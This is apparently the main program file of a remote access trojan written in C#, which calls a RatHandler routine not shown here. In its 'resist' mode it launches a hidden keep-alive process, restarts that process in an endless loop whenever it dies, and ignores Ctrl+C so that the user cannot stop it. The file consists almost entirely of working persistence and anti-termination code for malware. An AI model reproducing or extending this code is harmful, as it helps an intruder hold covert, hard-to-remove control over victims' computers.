using System.Diagnostics;
using System.Runtime.InteropServices;
using GeneralPurposeLib;
using RAT;
using LogLevel = GeneralPurposeLib.LogLevel;

Console.WriteLine("Starting...");
Logger.Init(LogLevel.Debug);

bool resist = args.Length > 0 && args[0] == "resist";

if (resist) {
    // Start keep alive service
    string keepAliveExe;
    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
        keepAliveExe = "RATKeepAlive.exe";
        Console.WriteLine("Running on Windows");
    } else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux)) {
        keepAliveExe = "RATKeepAlive";
        Console.WriteLine("Running on Linux");
    } else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX)) {
        keepAliveExe = "RATKeepAlive";
        Console.WriteLine("Running on OSX");
    } else {
        Console.WriteLine("Unsupported OS");
        keepAliveExe = "RATKeepAlive";
    }
    
    ProcessStartInfo start =
        new() {
            FileName = keepAliveExe,
            WindowStyle = ProcessWindowStyle.Hidden, // Hides GUI
            CreateNoWindow = true, // Hides console
        };
    Process keepAliveProc = args.Length > 1 && args[1] == "fromkeepalive" ? 
        Process.GetProcessesByName("ratkeepalive")[0] ?? throw new Exception("Failed to find keep alive process") : 
        Process.Start(start) ?? throw new Exception("Failed to start keep alive process");
    Thread keepAliveThread = new (() => {
        while (true) {
            keepAliveProc.WaitForExit();
            keepAliveProc = Process.Start(start);
        }
    });
    keepAliveThread.Start();
}

// Create cancellation token source
CancellationTokenSource cts = new();

Console.CancelKeyPress += (_, e) => {
    e.Cancel = true;
    if (!resist) {
        cts.Cancel();
    }
    else {
        Logger.Warn("Resisting cancellation...");
    }
};

// Create cancellation token
CancellationToken ct = cts.Token;
RatHandler.ExecuteAsync(ct).Wait(ct);
File.WriteAllText("donotrestart", "true"); // Tells the keep alive service to not restart the program
return 0;

// IHost host = Host.CreateDefaultBuilder(args)
//     .ConfigureServices(services => { services.AddHostedService<Worker>(); })
//     .Build();
//
// await host.RunAsync();